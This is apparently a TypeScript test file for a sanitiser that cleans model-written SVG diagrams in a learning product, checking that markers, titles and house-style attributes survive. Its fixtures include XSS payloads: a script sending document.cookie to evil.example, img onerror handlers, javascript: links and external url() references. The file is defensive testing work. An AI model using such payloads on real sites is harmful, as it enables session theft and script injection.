import assert from "node:assert/strict";
import { test } from "node:test";

import { MAX_FIGURE_NODES, SVG_FIGURE_INSTRUCTION, sanitizeSvgFigure } from "./svg-figure";

// ── rendering markup a language model wrote ──────────────────────────────────────────────────
//
// Owner, 2026-09-07: *"go into wondering because our mermaid diagrams and visuals arent as good as
// theres one for one"*. Theirs are raw SVG on a fixed canvas (docs/canvas-workspace-reference.md
// §10), so ours have to be too — and that means putting model-written markup into the page.
//
// 🔴🔴🔴 THESE ARE THE MOST IMPORTANT TESTS IN THE FEATURE. Everything else about a figure is
// cosmetic; this is the part where being wrong means running somebody else's script in a signed-in
// learner's session. The rule is an allow-list, so the calibration for every test below is: add the
// element or attribute to the set in svg-figure.ts and the test reddens.

const draw = (body: string) => `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">${body}</svg>`;

test("🔴 the house figure survives intact", () => {
  const figure = sanitizeSvgFigure(draw(
    `<defs><marker id="a" markerWidth="12" markerHeight="10" refX="10" refY="5" orient="auto"><polygon points="0,0 12,5 0,10" fill="#3C2A28"/></marker></defs>` +
    `<rect width="800" height="600" fill="#FFFCF0"/>` +
    `<rect x="310" y="80" width="180" height="60" rx="8" fill="#7BCAFF" stroke="#3C2A28" stroke-width="3"/>` +
    `<line x1="350" y1="140" x2="245" y2="205" stroke="#3C2A28" stroke-width="3" marker-end="url(#a)"/>` +
    `<text x="400" y="118" text-anchor="middle" font-size="28" font-weight="bold" fill="#261312">RAAS</text>`,
  ));
  assert.ok(figure);
  assert.match(figure.svg, /<rect x="310" y="80" width="180" height="60" rx="8"/);
  assert.match(figure.svg, /stroke-width="3"/);
  assert.match(figure.svg, /text-anchor="middle"/);
  assert.match(figure.svg, />RAAS<\/text>/);
});

test("🔴🔴 a script never reaches the page, and neither does its source", () => {
  // 🔴 THE SECOND HALF IS THE ONE THAT IS EASY TO GET WRONG. Dropping the <script> TAG and keeping
  // what is between it prints the attack as visible text in the middle of the drawing — which is
  // not a security hole but is an obvious, embarrassing one. An unknown element takes its contents.
  const figure = sanitizeSvgFigure(draw(`<script>fetch("https://evil.example?c="+document.cookie)</script><rect width="10" height="10"/>`));
  assert.ok(figure);
  assert.ok(!figure.svg.includes("script"));
  assert.ok(!figure.svg.includes("evil.example"), "the script's source is printed as text");
  assert.ok(!figure.svg.includes("cookie"));
  assert.match(figure.svg, /<rect width="10" height="10"\/>/, "the rest of the drawing was thrown away with it");
});

test("🔴🔴 foreignObject takes its HTML with it", () => {
  // The other way to smuggle a document in: SVG may hold arbitrary HTML inside foreignObject, and
  // leaving the contents behind hands the browser an <img onerror> to run.
  const figure = sanitizeSvgFigure(draw(`<foreignObject width="100" height="100"><img src=x onerror="alert(1)"></foreignObject><circle r="4"/>`));
  assert.ok(figure);
  assert.ok(!/foreignObject|onerror|<img/i.test(figure.svg));
  assert.match(figure.svg, /<circle r="4"\/>/);
});

test("🔴🔴 every event handler is dropped, whatever its casing", () => {
  const figure = sanitizeSvgFigure(draw(`<rect width="10" height="10" onclick="alert(1)" ONLOAD="alert(2)" onMouseOver="alert(3)"/>`));
  assert.ok(figure);
  assert.ok(!/on\w+=/i.test(figure.svg), "an event handler survived");
  assert.ok(!figure.svg.includes("alert"));
});

test("🔴🔴 nothing reaches the network, and no scheme survives anywhere", () => {
  for (const attack of [
    `<a href="javascript:alert(1)"><rect width="10" height="10"/></a>`,
    `<image href="https://evil.example/pixel.png" width="10" height="10"/>`,
    `<use href="https://evil.example/x.svg#a"/>`,
    `<rect width="10" height="10" fill="url(https://evil.example/p.svg#g)"/>`,
    `<rect width="10" height="10" fill='url("data:image/svg+xml,<svg/>")'/>`,
  ]) {
    const figure = sanitizeSvgFigure(draw(`${attack}<circle r="1"/>`));
    assert.ok(figure, `refused the whole figure for ${attack}`);
    assert.ok(!/evil\.example|javascript:|data:|href/i.test(figure.svg), `something reached out: ${figure.svg}`);
  }
});

test("🔴 style and class are not attributes here", () => {
  // A style string is a second grammar to sanitise, and everything it could say is already an
  // attribute. A class reaches the page's own stylesheet, which the figure has no business in.
  const figure = sanitizeSvgFigure(draw(`<rect width="10" height="10" style="background:url(javascript:1)" class="fixed inset-0 z-50"/>`));
  assert.ok(figure);
  assert.ok(!/style=|class=/.test(figure.svg));
});

test("🔴🔴 markers keep working, and two figures in one answer cannot collide", () => {
  // 🔴 IDS LEAK OUT OF AN SVG INTO THE WHOLE DOCUMENT. Two drawings in one answer both naming their
  // arrow `a` would leave the second one's arrows pointing at the first one's marker — a bug that
  // only appears when an answer happens to draw twice, which is exactly the kind that ships.
  const body = `<defs><marker id="a" markerWidth="12" markerHeight="10"><polygon points="0,0 12,5 0,10"/></marker></defs><line x1="0" y1="0" x2="9" y2="9" marker-end="url(#a)"/>`;
  const one = sanitizeSvgFigure(draw(body), "f1");
  const two = sanitizeSvgFigure(draw(body), "f2");
  assert.ok(one && two);
  assert.match(one.svg, /id="f1-a"/);
  assert.match(one.svg, /marker-end="url\(#f1-a\)"/);
  assert.match(two.svg, /marker-end="url\(#f2-a\)"/);
  assert.ok(!one.svg.includes("f2-"), "the two figures share an id space");
  // An id anywhere but a marker is dropped: nothing else needs one and everything else could be
  // targeted by the page's own CSS or script.
  const other = sanitizeSvgFigure(draw(`<rect id="app" width="10" height="10"/>`));
  assert.ok(other && !other.svg.includes("id="));
});

test("🔴 a figure without a frame is refused rather than repaired", () => {
  // No viewBox means no intrinsic aspect ratio, so scaling it to the column crops it or leaves it
  // 150px tall. Half a drawing renders as a fact, which is worse than a code block.
  assert.equal(sanitizeSvgFigure(`<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>`), null);
  assert.equal(sanitizeSvgFigure(`<div><svg viewBox="0 0 8 6"><rect/></svg></div>`), null, "the root must be the svg itself");
  assert.equal(sanitizeSvgFigure(""), null);
  assert.equal(sanitizeSvgFigure("flowchart TD; A-->B"), null, "a mermaid fence mislabelled as a figure drew something");
});

test("🔴 a runaway drawing is refused before it is rendered", () => {
  const many = draw(`<rect width="1" height="1"/>`.repeat(MAX_FIGURE_NODES + 5));
  assert.equal(sanitizeSvgFigure(many), null);
  assert.ok(sanitizeSvgFigure(draw(`<rect width="1" height="1"/>`.repeat(10))));
  assert.equal(sanitizeSvgFigure(draw(`<rect width="1" height="1" fill="${"#".repeat(1000)}"/>`))?.svg.includes("fill="), false, "a 1000-character attribute was kept");
});

test("🔴 the title is read out for someone who cannot see the drawing", () => {
  const figure = sanitizeSvgFigure(draw(`<title>How ACE inhibitors block the RAAS pathway</title><rect width="10" height="10"/>`));
  assert.ok(figure);
  assert.equal(figure.title, "How ACE inhibitors block the RAAS pathway");
  assert.equal(sanitizeSvgFigure(draw(`<rect width="10" height="10"/>`))?.title, "");
});

test("🔴 loose angle brackets in text cannot close a tag", () => {
  const figure = sanitizeSvgFigure(draw(`<text x="1" y="2">a < b > c</text>`));
  assert.ok(figure);
  assert.ok(!figure.svg.includes("< b >"));
  assert.match(figure.svg, /<text x="1" y="2">/);
});

test("🔴🔴🔴 everything the house style tells the model to draw survives the sanitiser", () => {
  // 🔴 THE DRIFT THIS CATCHES IS SILENT AND EXPENSIVE. The instruction and the allow-list are two
  // lists in two files that have to agree. Tighten the allow-list without reading the prompt and
  // every figure quietly loses its arrowheads; widen the prompt without reading the allow-list and
  // the model draws something that is stripped on the way in. Either way nothing throws, nothing
  // logs, and the only symptom is diagrams that look slightly wrong.
  //
  // So the house style is drawn here exactly as the instruction describes it, and asserted to come
  // out whole.
  const asInstructed = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">`
    + `<title>What this shows</title>`
    + `<defs><marker id="arrow" markerWidth="12" markerHeight="10" refX="10" refY="5" orient="auto"><polygon points="0,0 12,5 0,10" fill="currentColor"/></marker></defs>`
    + `<rect x="310" y="90" width="180" height="60" rx="8" fill="#7BCAFF" stroke="currentColor" stroke-width="3"/>`
    + `<line x1="350" y1="150" x2="245" y2="215" stroke="currentColor" stroke-width="3" marker-end="url(#arrow)"/>`
    + `<line x1="200" y1="500" x2="255" y2="330" stroke="#879A39" stroke-width="4" marker-end="url(#arrow)"/>`
    + `<text x="400" y="52" text-anchor="middle" font-size="32" font-weight="bold" fill="currentColor">Title</text>`
    + `</svg>`;
  const figure = sanitizeSvgFigure(asInstructed, "t");
  assert.ok(figure, "the house style is refused by our own sanitiser");
  for (const kept of [
    'viewbox="0 0 800 600"', 'rx="8"', 'fill="#7BCAFF"', 'stroke="currentColor"', 'stroke-width="3"',
    'stroke="#879A39"', 'stroke-width="4"', 'marker-end="url(#t-arrow)"', 'markerwidth="12"',
    'refx="10"', 'orient="auto"', 'points="0,0 12,5 0,10"', 'text-anchor="middle"',
    'font-size="32"', 'font-weight="bold"',
  ]) {
    assert.ok(figure.svg.toLowerCase().includes(kept.toLowerCase()), `the house style uses ${kept} and the sanitiser drops it`);
  }
  assert.equal(figure.title, "What this shows");
});

test("🔴 the instruction and the sanitiser name the same fills, and the prompt has no em dash", () => {
  // The four fills each MEAN something (what starts it, what it does, the outcome, what blocks it),
  // so a learner reads the same code in every drawing. If the instruction stops naming one, the
  // meaning goes with it.
  for (const fill of ["#7BCAFF", "#5ABDAC", "#DFB431", "#879A39"]) {
    assert.ok(SVG_FIGURE_INSTRUCTION.includes(fill), `the house palette lost ${fill}`);
  }
  // Owner 2026-08-25, standing rule. Every prompt string in this product is checked; this one is
  // asserted at its source too, because it is assembled into the packet from another file.
  assert.ok(!SVG_FIGURE_INSTRUCTION.includes("—"), "the instruction carries an em dash");
  // And it must send the other two shapes to the right lane, or every comparison arrives as SVG.
  assert.match(SVG_FIGURE_INSTRUCTION, /```visual/);
  assert.match(SVG_FIGURE_INSTRUCTION, /```mermaid/);
});
